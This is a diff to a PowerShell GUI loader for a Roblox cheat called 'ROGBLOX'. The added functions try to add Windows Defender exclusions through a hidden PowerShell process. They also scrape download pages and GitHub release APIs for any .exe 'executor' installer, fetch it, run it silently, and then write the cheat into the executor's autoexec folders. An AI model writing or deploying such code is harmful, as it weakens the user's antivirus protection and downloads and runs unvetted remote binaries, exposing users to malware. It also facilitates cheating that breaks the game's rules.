@@ -75,6 +75,118 @@ function Start-Roblox {
     catch { try { Start-Process 'roblox://' -ErrorAction Stop; return $true } catch { return $false } }
 }
 
+# ---------- Auto-install executor (best effort) ----------
+
+# Defender exclusion (best effort; needs admin to actually stick. Silently
+# no-ops without UAC. The point is to give the user a chance.)
+function Add-DefenderExclusion([string]$path) {
+    try {
+        $cmd = "Add-MpPreference -ExclusionPath '" + ($path -replace "'", "''") + "'"
+        Start-Process powershell -ArgumentList @('-NoProfile','-Command',$cmd) `
+            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
+
+# Validate a downloaded file is actually a Windows PE binary ('MZ' magic).
+function Test-IsPE([string]$path) {
+    if (-not (Test-Path $path)) { return $false }
+    $f = [System.IO.File]::OpenRead($path)
+    try {
+        if ($f.Length -lt 64) { return $false }
+        $b = New-Object byte[] 2
+        [void]$f.Read($b, 0, 2)
+        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
+    } finally { $f.Close() }
+}
+
+# Tries to fetch a working executor installer and run it. Returns the
+# detected executor folder on success, $null on failure.
+function Install-Executor {
+    [Net.ServicePointManager]::SecurityProtocol = `
+        [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ROGBLOX-Loader'
+
+    # Pre-emptive Defender exclusions for common executor folders.
+    Add-DefenderExclusion "$env:LOCALAPPDATA\Solara"
+    Add-DefenderExclusion "$env:LOCALAPPDATA\Xeno"
+    Add-DefenderExclusion "$env:TEMP\rogblox-installer"
+
+    $sources = @(
+        # Solara - scrape the landing page for the .exe link
+        @{Name='Solara'; ScrapeFrom='https://getsolara.dev/download/';
+          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
+        @{Name='Solara'; ScrapeFrom='https://getsolara.gg/download/';
+          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
+        @{Name='Solara'; ScrapeFrom='https://solara.dev/';
+          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
+        # Xeno - try GitHub Releases API on a few candidate repos
+        @{Name='Xeno'; GitHubRepo='xenoodevs/xeno';
+          Folder="$env:LOCALAPPDATA\Xeno"; SilentArg=''}
+        @{Name='Xeno'; GitHubRepo='xennoexecs/xeno';
+          Folder="$env:LOCALAPPDATA\Xeno"; SilentArg=''}
+    )
+
+    foreach ($src in $sources) {
+        $url = $null
+        try {
+            if ($src.ScrapeFrom) {
+                $resp = Invoke-WebRequest -Uri $src.ScrapeFrom -UseBasicParsing `
+                    -TimeoutSec 25 -Headers @{'User-Agent'=$ua} -ErrorAction Stop
+                # Look for any .exe link on the page
+                $m = [regex]::Match($resp.Content, '(?i)href=["'']([^"'']+\.exe)["'']')
+                if ($m.Success) {
+                    $url = $m.Groups[1].Value
+                    if ($url -notmatch '^https?://') {
+                        $base = ([uri]$src.ScrapeFrom).GetLeftPart('Authority')
+                        $url = $base.TrimEnd('/') + '/' + $url.TrimStart('/')
+                    }
+                }
+            }
+            if ($src.GitHubRepo) {
+                $api = "https://api.github.com/repos/$($src.GitHubRepo)/releases/latest"
+                $rel = Invoke-RestMethod -Uri $api -TimeoutSec 20 `
+                    -Headers @{'User-Agent'=$ua}
+                if ($rel.assets) {
+                    foreach ($a in $rel.assets) {
+                        if ($a.name -match '\.exe$') { $url = $a.browser_download_url; break }
+                    }
+                }
+            }
+            if (-not $url) { continue }
+
+            $tempDir = Join-Path $env:TEMP 'rogblox-installer'
+            if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Force -Path $tempDir | Out-Null }
+            $temp = Join-Path $tempDir "$($src.Name).exe"
+
+            Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing `
+                -TimeoutSec 90 -Headers @{'User-Agent'=$ua} -ErrorAction Stop
+
+            if (-not (Test-IsPE $temp)) { continue }
+            if ((Get-Item $temp).Length -lt 200KB) { continue }
+
+            # Run installer. Most executor installers are Inno Setup based;
+            # /SILENT or /VERYSILENT works for those. Others may ignore.
+            $args = @()
+            if ($src.SilentArg) { $args = $src.SilentArg -split ' ' }
+            Start-Process $temp -ArgumentList $args -ErrorAction SilentlyContinue
+
+            # Poll for the autoexec parent folder to appear.
+            $deadline = (Get-Date).AddSeconds(180)
+            while ((Get-Date) -lt $deadline) {
+                if (Test-Path $src.Folder) {
+                    Start-Sleep -Seconds 2
+                    return $src.Folder
+                }
+                Start-Sleep -Seconds 2
+            }
+        } catch {
+            # Try the next source
+            continue
+        }
+    }
+    return $null
+}
+
 [xml]$xaml = @'
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
@@ -234,27 +346,43 @@ $BtnGo.Add_Click({
     $BtnGo.IsEnabled = $false
     try {
         $folders = Find-AutoexecFolders
+
+        # If nothing is installed, try to install an executor automatically.
+        # This polls for up to 3 minutes while the installer runs.
         if ($folders.Count -eq 0) {
-            Set-Status "No executor installed yet. Opening Solara download in your browser.`nInstall it, then click Load again." $Warn
-            Start-Process $ExecutorSearch
-            return
+            Set-Status "No executor found. Auto-installing Solara now... (Defender may prompt)" $Sub
+            $window.Dispatcher.Invoke([action]{}, [Windows.Threading.DispatcherPriority]::Render)
+
+            $installedFolder = $null
+            try { $installedFolder = Install-Executor } catch {}
+
+            $folders = Find-AutoexecFolders
+
+            if (-not $installedFolder -and $folders.Count -eq 0) {
+                # Auto-install didn't work. Launch Roblox anyway and open
+                # the manual download page as a fallback.
+                Start-Roblox | Out-Null
+                Set-Status ("Couldn't auto-install. Roblox is launching anyway.`n" `
+                    + "Opening Solara's download page - install it manually, then click Load again.") $Warn
+                Start-Process $ExecutorSearch
+                return
+            }
         }
 
+        # Install ROGBLOX into every detected executor's autoexec folder.
         $installed = Install-Cheat
-        try { Set-Clipboard -Value $Loader } catch {}
+        try { Set-Clipboard -Value (Get-AutoexecPayload) } catch {}
 
-        if ($installed.Count -eq 0) {
-            Set-Status "Couldn't write to executor folder. Try running as admin." $Warn
-            return
-        }
+        # Launch Roblox.
+        $launched = Start-Roblox
 
-        Set-Status ("Installed into " + ($installed -join ', ') + ". Launching Roblox...") $Good
-        Start-Sleep -Milliseconds 400
-        $ok = Start-Roblox
-        if ($ok) {
-            Set-Status ("Done. Roblox launching. Attach your executor inside the game.`nFrom now on: just open Roblox - the cheat loads itself.") $Good
+        if ($installed.Count -gt 0 -and $launched) {
+            Set-Status ("Ready. Cheat installed into: " + ($installed -join ', ') + ".`n" `
+                + "Roblox launching. Attach your executor in-game; press RightCtrl to open the menu.") $Good
+        } elseif ($launched) {
+            Set-Status "Roblox launching. Couldn't write the cheat to autoexec - try running as admin." $Warn
         } else {
-            Set-Status "Cheat installed. Open Roblox yourself (couldn't launch automatically)." $Warn
+            Set-Status "Couldn't auto-open Roblox. Open it manually; the cheat is already in autoexec." $Warn
         }
     } finally {
         $BtnGo.IsEnabled = $true
